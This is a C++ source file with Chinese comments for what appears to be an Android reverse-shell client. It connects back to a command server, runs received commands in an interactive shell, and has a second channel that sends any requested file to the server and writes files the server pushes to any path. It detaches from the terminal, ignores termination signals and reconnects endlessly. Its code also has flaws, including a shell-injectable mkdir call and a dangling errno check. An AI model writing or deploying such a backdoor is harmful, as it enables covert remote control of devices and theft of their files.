
#include <iostream>
#include <string>
#include <vector>
#include <mutex>
#include <atomic>
#include <functional>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <zlib.h>

// ================================================================
//  协议常量
// ================================================================
const char*    SERVER_IP             = "127.0.0.1";
const int      CMD_PORT              = 9001;
const int      FILE_PORT             = 9002;
const uint32_t MAGIC                 = 0x52535448;
const uint32_t MAX_PAYLOAD           = 4 * 1024 * 1024;
const uint32_t FILE_CHUNK_SIZE       = 65536;
const int      HEARTBEAT_SEC         = 5;
const int      HEARTBEAT_TIMEOUT_SEC = 15;
const int      HANDSHAKE_TIMEOUT_SEC = 10;
const int      SOCK_IO_TIMEOUT_SEC   = 30;

// ================================================================
//  消息类型
// ================================================================
enum MsgType : uint8_t {
    TYPE_HANDSHAKE      = 0x00,
    TYPE_HEARTBEAT      = 0x01,
    TYPE_HEARTBEAT_ACK  = 0x02,
    TYPE_ACK            = 0x03,
    TYPE_ERROR          = 0x04,
    TYPE_HANDSHAKE_ACK  = 0x05,
    TYPE_CMD_REQ        = 0x10,
    TYPE_CMD_RESP       = 0x11,
    TYPE_FILE_OPEN      = 0x20,
    TYPE_FILE_CHUNK     = 0x21,
    TYPE_FILE_CLOSE     = 0x22,
    TYPE_FILE_GET       = 0x23,
};

enum Flags : uint8_t {
    FLAG_NONE       = 0x00,
    FLAG_NEED_ACK   = 0x01,
    FLAG_COMPRESSED = 0x02,
};

// ================================================================
//  帧头
// ================================================================
#pragma pack(push, 1)
struct FrameHeader {
    uint32_t magic;
    uint32_t seq;
    uint8_t  type;
    uint8_t  flags;
    uint16_t reserved;
    uint32_t payload_len;
};
#pragma pack(pop)
static_assert(sizeof(FrameHeader) == 16, "FrameHeader size mismatch");

// ================================================================
//  可靠 IO（修复：区分超时/EINTR 和真正断线）
// ================================================================
bool write_exact(int fd, const void* buf, size_t len) {
    const char* p = (const char*)buf;
    size_t total = 0;
    while (total < len) {
        ssize_t n = write(fd, p + total, len - total);
        if (n > 0) { total += n; continue; }
        if (n == 0) return false;
        if (errno == EINTR) continue;                           // 信号打断，重试
        return false;                                           // 真正错误
    }
    return true;
}

bool read_exact(int fd, void* buf, size_t len) {
    char* p = (char*)buf;
    size_t total = 0;
    while (total < len) {
    std::cerr << "[-] read errno=" << errno 
              << " EAGAIN=" << EAGAIN 
              << " EWOULDBLOCK=" << EWOULDBLOCK 
              << " EINTR=" << EINTR << std::endl;

    
    
    
        ssize_t n = read(fd, p + total, len - total);
        if (n > 0) { total += n; continue; }
        if (n == 0) return false;                               // 对端关闭
        if (errno == EINTR)                          continue;  // 信号打断，重试
        if (errno == EAGAIN || errno == EWOULDBLOCK) continue;  // SO_RCVTIMEO 超时，重试
        if (errno == EPERM)   
        return false;                                           // 真正 IO 错误
    }
    return true;
}

// ================================================================
//  Socket 选项
// ================================================================
void set_socket_options(int fd, int io_timeout_sec) {
    int on = 1;
    setsockopt(fd, SOL_SOCKET,  SO_KEEPALIVE, &on, sizeof(on));
    int idle = 10, interval = 3, count = 3;
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPIDLE,  &idle,     sizeof(idle));
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &interval, sizeof(interval));
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT,   &count,    sizeof(count));

    struct timeval tv{};
    tv.tv_sec  = io_timeout_sec;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
}

// ================================================================
//  CRC32
// ================================================================
uint32_t calc_crc32(const void* data, size_t len) {
    return (uint32_t)crc32(0, (const Bytef*)data, (uInt)len);
}

// ================================================================
//  Token 生成
// ================================================================
std::string generate_token() {
    uint8_t raw[8] = {};
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) { read(fd, raw, sizeof(raw)); close(fd); }
    else {
        uint64_t t = (uint64_t)time(nullptr) ^ ((uint64_t)getpid() << 32);
        memcpy(raw, &t, 8);
    }
    char buf[17];
    snprintf(buf, sizeof(buf),
        "%02x%02x%02x%02x%02x%02x%02x%02x",
        raw[0],raw[1],raw[2],raw[3],raw[4],raw[5],raw[6],raw[7]);
    return std::string(buf, 16);
}

// ================================================================
//  Connection（不拥有 fd 所有权）
// ================================================================
class Connection {
public:
    explicit Connection(int fd) : fd_(fd), seq_(0) {}
    ~Connection() = default;

    bool send_frame(uint8_t type, uint8_t flags,
                    const void* payload, uint32_t plen) {
        if (fd_ < 0 || plen > MAX_PAYLOAD) return false;

        FrameHeader hdr{};
        hdr.magic       = htonl(MAGIC);
        hdr.seq         = htonl(seq_++);
        hdr.type        = type;
        hdr.flags       = flags;
        hdr.reserved    = 0;
        hdr.payload_len = htonl(plen);

        uint32_t crc = calc_crc32(&hdr, sizeof(hdr));
        if (plen > 0)
            crc = (uint32_t)crc32(crc, (const Bytef*)payload, plen);
        uint32_t net_crc = htonl(crc);

        std::lock_guard<std::mutex> lk(write_mu_);
        if (!write_exact(fd_, &hdr, sizeof(hdr)))         return false;
        if (plen > 0 && !write_exact(fd_, payload, plen)) return false;
        if (!write_exact(fd_, &net_crc, 4))               return false;
        return true;
    }

    bool send_frame(uint8_t type, uint8_t flags, const std::string& s) {
        return send_frame(type, flags, s.data(), (uint32_t)s.size());
    }

    bool recv_frame(uint8_t& type, uint8_t& flags,
                    uint32_t& seq, std::string& payload) {
        FrameHeader hdr{};
        if (!read_exact(fd_, &hdr, sizeof(hdr))) return false;

        if (ntohl(hdr.magic) != MAGIC) {
            std::cerr << "[-] 魔数不匹配" << std::endl;
            return false;
        }

        uint32_t plen = ntohl(hdr.payload_len);
        if (plen > MAX_PAYLOAD) return false;

        payload.resize(plen);
        if (plen > 0 && !read_exact(fd_, &payload[0], plen)) return false;

        uint32_t net_crc = 0;
        if (!read_exact(fd_, &net_crc, 4)) return false;
        uint32_t recv_crc = ntohl(net_crc);

        uint32_t calc = calc_crc32(&hdr, sizeof(hdr));
        if (plen > 0)
            calc = (uint32_t)crc32(calc, (const Bytef*)payload.data(), plen);
        if (calc != recv_crc) {
            std::cerr << "[-] CRC 校验失败" << std::endl;
            return false;
        }

        type  = hdr.type;
        flags = hdr.flags;
        seq   = ntohl(hdr.seq);
        return true;
    }

    bool send_ack(uint32_t acked_seq) {
        uint32_t net = htonl(acked_seq);
        return send_frame(TYPE_ACK, FLAG_NONE, &net, 4);
    }

    int fd() const { return fd_; }

private:
    int        fd_;
    uint32_t   seq_;
    std::mutex write_mu_;
};

// ================================================================
//  Shell 管理
// ================================================================
const std::string CMD_END_MARKER = "__CMDEND_RSTH__";

struct ShellCtx {
    int   stdin_pipe[2]  = {-1, -1};
    int   stdout_pipe[2] = {-1, -1};
    pid_t pid            = -1;
    std::string       output_buf;
    std::atomic<bool> waiting{false};
    std::mutex        mu;

    void reset_state() {
        std::lock_guard<std::mutex> lk(mu);
        output_buf.clear();
        waiting.store(false);
    }
};

static ShellCtx g_shell;

bool shell_start() {
    if (pipe(g_shell.stdin_pipe)  < 0) return false;
    if (pipe(g_shell.stdout_pipe) < 0) return false;

    pid_t pid = fork();
    if (pid == 0) {
        // 修复：脱离终端，避免收到 SIGTSTP/SIGHUP
        setsid();

        dup2(g_shell.stdin_pipe[0],  0);
        dup2(g_shell.stdout_pipe[1], 1);
        dup2(g_shell.stdout_pipe[1], 2);
        close(g_shell.stdin_pipe[1]);
        close(g_shell.stdout_pipe[0]);
        setenv("TERM", "dumb", 1);
        execl("/system/bin/sh", "sh", "-i", nullptr);
        _exit(1);
    }
    if (pid < 0) return false;

    g_shell.pid = pid;
    close(g_shell.stdin_pipe[0]);
    close(g_shell.stdout_pipe[1]);
    return true;
}

void shell_kill() {
    if (g_shell.pid > 0) {
        kill(g_shell.pid, SIGKILL);
        g_shell.pid = -1;
    }
    for (int& fd : g_shell.stdin_pipe)  { if (fd >= 0) { close(fd); fd = -1; } }
    for (int& fd : g_shell.stdout_pipe) { if (fd >= 0) { close(fd); fd = -1; } }
}

void shell_read_loop(std::function<void(const std::string&)> on_result) {
    char buf[16384];
    while (true) {
        ssize_t n = read(g_shell.stdout_pipe[0], buf, sizeof(buf));
        if (n <= 0) break;
        if (!g_shell.waiting.load()) continue;

        std::string result;
        bool found = false;
        {
            std::lock_guard<std::mutex> lk(g_shell.mu);
            g_shell.output_buf.append(buf, n);
            size_t pos = g_shell.output_buf.find(CMD_END_MARKER);
            if (pos != std::string::npos) {
                result = g_shell.output_buf.substr(0, pos);
                g_shell.output_buf.clear();
                found = true;
            }
        }
        if (found) {
            g_shell.waiting.store(false);
            on_result(result);
        }
    }
}

void shell_exec(const std::string& cmd) {
    if (g_shell.stdin_pipe[1] < 0 || cmd.empty()) return;
    std::string full = cmd + "; echo '" + CMD_END_MARKER + "'\n";
    {
        std::lock_guard<std::mutex> lk(g_shell.mu);
        g_shell.output_buf.clear();
    }
    g_shell.waiting.store(true);
    write_exact(g_shell.stdin_pipe[1], full.c_str(), full.size());
}

// ================================================================
//  文件接收会话
// ================================================================
struct FileRecvSession {
    std::string path;
    int         fd           = -1;
    uint32_t    total_chunks = 0;
    uint32_t    recv_chunks  = 0;
    uint32_t    running_crc  = 0;

    void reset() {
        if (fd >= 0) { close(fd); fd = -1; }
        path.clear();
        total_chunks = recv_chunks = 0;
        running_crc = (uint32_t)crc32(0, nullptr, 0);
    }
};

// ================================================================
//  文件通道
// ================================================================
void send_file(Connection& conn, const std::string& path) {
    int fd = open(path.c_str(), O_RDONLY);
    if (fd < 0) {
        conn.send_frame(TYPE_ERROR, FLAG_NONE, "File not found: " + path);
        return;
    }

    off_t    file_size    = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    uint32_t total_chunks = (uint32_t)((file_size + FILE_CHUNK_SIZE - 1) / FILE_CHUNK_SIZE);

    std::string open_payload;
    open_payload += path + '\0';
    uint64_t net_size   = htobe64((uint64_t)file_size);
    uint32_t net_chunks = htonl(total_chunks);
    open_payload.append((char*)&net_size,   8);
    open_payload.append((char*)&net_chunks, 4);
    conn.send_frame(TYPE_FILE_OPEN, FLAG_NONE, open_payload);

    std::vector<char> buf(FILE_CHUNK_SIZE);
    uint32_t chunk_idx = 0;
    uint32_t file_crc  = (uint32_t)crc32(0, nullptr, 0);
    ssize_t  n;

    while ((n = read(fd, buf.data(), FILE_CHUNK_SIZE)) > 0) {
        file_crc = (uint32_t)crc32(file_crc, (const Bytef*)buf.data(), n);
        std::string chunk_payload;
        uint32_t net_idx = htonl(chunk_idx++);
        chunk_payload.append((char*)&net_idx, 4);
        chunk_payload.append(buf.data(), n);
        if (!conn.send_frame(TYPE_FILE_CHUNK, FLAG_NONE, chunk_payload)) {
            std::cerr << "[-] 文件发送中断" << std::endl;
            close(fd);
            return;
        }
    }
    close(fd);

    uint32_t net_crc = htonl(file_crc);
    conn.send_frame(TYPE_FILE_CLOSE, FLAG_NONE, &net_crc, 4);
    std::cout << "[+] 文件发送完成: " << path << std::endl;
}

void handle_file_channel(Connection& conn) {
    FileRecvSession session;
    session.reset();

    uint8_t type, flags;
    uint32_t seq;
    std::string payload;

    while (conn.recv_frame(type, flags, seq, payload)) {
        switch (type) {
            case TYPE_FILE_GET:
                send_file(conn, payload);
                break;

            case TYPE_FILE_OPEN: {
                session.reset();
                size_t null_pos = payload.find('\0');
                if (null_pos == std::string::npos) break;
                session.path = payload.substr(0, null_pos);

                size_t slash = session.path.find_last_of('/');
                if (slash != std::string::npos) {
                    std::string dir = session.path.substr(0, slash);
                    system(("mkdir -p \"" + dir + "\" 2>/dev/null").c_str());
                }
                session.fd = open(session.path.c_str(),
                                  O_WRONLY | O_CREAT | O_TRUNC, 0666);
                if (session.fd < 0) {
                    conn.send_frame(TYPE_ERROR, FLAG_NONE,
                                    "Cannot create: " + session.path);
                    break;
                }
                size_t off = null_pos + 1;
                if (payload.size() >= off + 12) {
                    uint32_t net_chunks;
                    memcpy(&net_chunks, payload.data() + off + 8, 4);
                    session.total_chunks = ntohl(net_chunks);
                }
                session.running_crc = (uint32_t)crc32(0, nullptr, 0);
                std::cout << "[+] 开始接收文件: " << session.path << std::endl;
                break;
            }

            case TYPE_FILE_CHUNK: {
                if (session.fd < 0 || payload.size() < 4) break;
                const char* data = payload.data() + 4;
                size_t      dlen = payload.size() - 4;
                write_exact(session.fd, data, dlen);
                session.running_crc = (uint32_t)crc32(
                    session.running_crc, (const Bytef*)data, dlen);
                session.recv_chunks++;
                break;
            }

            case TYPE_FILE_CLOSE: {
                if (session.fd < 0 || payload.size() < 4) break;
                uint32_t expected_crc;
                memcpy(&expected_crc, payload.data(), 4);
                expected_crc = ntohl(expected_crc);
                close(session.fd);
                session.fd = -1;

                if (session.running_crc == expected_crc) {
                    std::cout << "[+] 文件校验通过: " << session.path << std::endl;
                    conn.send_frame(TYPE_ACK, FLAG_NONE, "OK:" + session.path);
                } else {
                    std::cerr << "[-] CRC 不匹配，删除: " << session.path << std::endl;
                    unlink(session.path.c_str());
                    conn.send_frame(TYPE_ERROR, FLAG_NONE, "CRC_FAIL:" + session.path);
                }
                session.reset();
                break;
            }

            default: break;
        }
    }
    session.reset();
}

// ================================================================
//  命令通道
// ================================================================
void run_cmd_channel(Connection& conn) {
    auto on_result = [&](const std::string& result) {
        conn.send_frame(TYPE_CMD_RESP, FLAG_NONE, result);
        std::cout << "[+] 命令结果已发送 (" << result.size() << " bytes)" << std::endl;
    };
    std::thread(shell_read_loop, on_result).detach();

    std::atomic<bool>   hb_stop{false};
    std::atomic<time_t> last_pong{time(nullptr)};
    int conn_fd = conn.fd();

    std::thread hb_thread([&hb_stop, &last_pong, &conn, conn_fd]() {
        while (!hb_stop.load()) {
            std::this_thread::sleep_for(std::chrono::seconds(HEARTBEAT_SEC));
            if (hb_stop.load()) break;
            if (time(nullptr) - last_pong.load() > HEARTBEAT_TIMEOUT_SEC) {
                std::cerr << "[-] 心跳超时，主动断开" << std::endl;
                shutdown(conn_fd, SHUT_RDWR);
                return;
            }
            conn.send_frame(TYPE_HEARTBEAT, FLAG_NONE, nullptr, 0);
        }
    });

    uint8_t type, flags;
    uint32_t seq;
    std::string payload;

    while (conn.recv_frame(type, flags, seq, payload)) {
        last_pong.store(time(nullptr));
        if (flags & FLAG_NEED_ACK) conn.send_ack(seq);

        switch (type) {
            case TYPE_HEARTBEAT:
                conn.send_frame(TYPE_HEARTBEAT_ACK, FLAG_NONE, nullptr, 0);
                break;
            case TYPE_HEARTBEAT_ACK:
                break;
            case TYPE_CMD_REQ:
                std::cout << "[+] 执行命令: " << payload << std::endl;
                shell_exec(payload);
                break;
            case TYPE_ERROR:
                std::cerr << "[-] 服务端报错: " << payload << std::endl;
                break;
            default:
                std::cerr << "[-] 未知类型: 0x"
                          << std::hex << (int)type << std::dec << std::endl;
        }
    }

    hb_stop.store(true);
    hb_thread.join();
    std::cout << "[-] 命令通道断开" << std::endl;
}

// ================================================================
//  握手
// ================================================================
bool do_handshake(Connection& conn, const std::string& token) {
    set_socket_options(conn.fd(), HANDSHAKE_TIMEOUT_SEC);

    if (!conn.send_frame(TYPE_HANDSHAKE, FLAG_NONE, token)) {
        std::cerr << "[-] 握手发送失败" << std::endl;
        return false;
    }

    uint8_t type, flags;
    uint32_t seq;
    std::string payload;
    if (!conn.recv_frame(type, flags, seq, payload) || type != TYPE_HANDSHAKE_ACK) {
        std::cerr << "[-] 握手响应失败" << std::endl;
        return false;
    }

    std::cout << "[+] 握手成功 token=" << token << std::endl;
    set_socket_options(conn.fd(), SOCK_IO_TIMEOUT_SEC);
    return true;
}

// ================================================================
//  TCP 连接建立
// ================================================================
int tcp_connect(const char* ip, int port) {
    while (true) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) { sleep(3); continue; }

        struct sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);

        std::cout << "[*] 连接 " << ip << ":" << port << " ..." << std::endl;
        if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            std::cout << "[+] 已连接 port=" << port << std::endl;
            return fd;
        }
        close(fd);
        sleep(3);
    }
}

// ================================================================
//  main
// ================================================================
int main() {
    // 修复：忽略所有可能导致进程被挂起/终止的终端信号
    signal(SIGPIPE, SIG_IGN);
    signal(SIGTSTP, SIG_IGN);
    signal(SIGHUP,  SIG_IGN);
    signal(SIGTTOU, SIG_IGN);
    signal(SIGTTIN, SIG_IGN);

    // 修复：脱离终端控制组，成为新会话 leader
    setsid();

    while (true) {
        std::string token = generate_token();
        std::cout << "[*] 新会话 token=" << token << std::endl;

        // 1. 命令通道握手
        int cmd_fd = tcp_connect(SERVER_IP, CMD_PORT);
        Connection cmd_conn(cmd_fd);
        if (!do_handshake(cmd_conn, token)) {
            close(cmd_fd);
            sleep(3);
            continue;
        }

        // 2. 文件通道握手
        int file_fd = tcp_connect(SERVER_IP, FILE_PORT);
        Connection file_conn(file_fd);
        if (!do_handshake(file_conn, token)) {
            shutdown(cmd_fd, SHUT_RDWR);
            close(cmd_fd);
            close(file_fd);
            sleep(3);
            continue;
        }

        // 3. 重置 shell 状态
        g_shell.reset_state();

        // 4. 启动 shell
        if (!shell_start()) {
            std::cerr << "[-] Shell 启动失败" << std::endl;
            shutdown(cmd_fd,  SHUT_RDWR); close(cmd_fd);
            shutdown(file_fd, SHUT_RDWR); close(file_fd);
            sleep(3);
            continue;
        }

        // 5. 文件通道独立线程
        std::thread file_thread([&file_conn]() {
            handle_file_channel(file_conn);
        });

        // 6. 命令通道阻塞运行
        run_cmd_channel(cmd_conn);

        // 7. 通知文件通道退出并等待
        shutdown(file_fd, SHUT_RDWR);
        file_thread.join();

        // 8. 关闭所有 fd
        close(cmd_fd);
        close(file_fd);

        // 9. 清理 shell
        shell_kill();

        std::cout << "[-] 会话结束，3秒后重连..." << std::endl;
        sleep(3);
    }
    return 0;
}
